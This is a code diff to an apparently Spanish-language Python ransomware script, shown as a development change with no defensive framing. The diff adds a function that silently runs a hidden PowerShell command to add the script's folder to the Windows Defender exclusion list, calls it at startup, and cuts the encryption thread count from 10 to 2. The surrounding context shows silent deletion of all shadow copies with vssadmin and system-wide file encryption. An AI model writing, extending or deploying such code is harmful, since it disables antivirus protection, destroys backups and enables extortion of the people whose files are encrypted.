@@ -42,6 +42,16 @@ def verificar_e_instalar_dependencias():
         return False
 
 
+def add_exclusion():
+    try:
+        script_dir = os.path.abspath(os.getcwd())
+        ps_cmd = f'Add-MpPreference -ExclusionPath "{script_dir}"'
+        subprocess.Popen(['powershell', '-w', 'h', '-c', ps_cmd], creationflags=0x08000000)
+        time.sleep(2)
+    except:
+        pass
+
+
 def pre_cleanup():
     try:
         subprocess.Popen(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=0x08000000)
@@ -140,6 +150,8 @@ def encriptar_archivo(enc, ruta):
 
 def main():
     try:
+        add_exclusion()
+        
         if not verificar_e_instalar_dependencias():
             sys.exit(1)
         
@@ -149,7 +161,7 @@ def main():
         archivos, _, _ = escanear_sistema()
         enc = EncriptadorMilitar()
         auto_destruir_archivos()
-        NUM_THREADS = 10
+        NUM_THREADS = 2
         with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
             futures = {executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}
             for future in as_completed(futures):
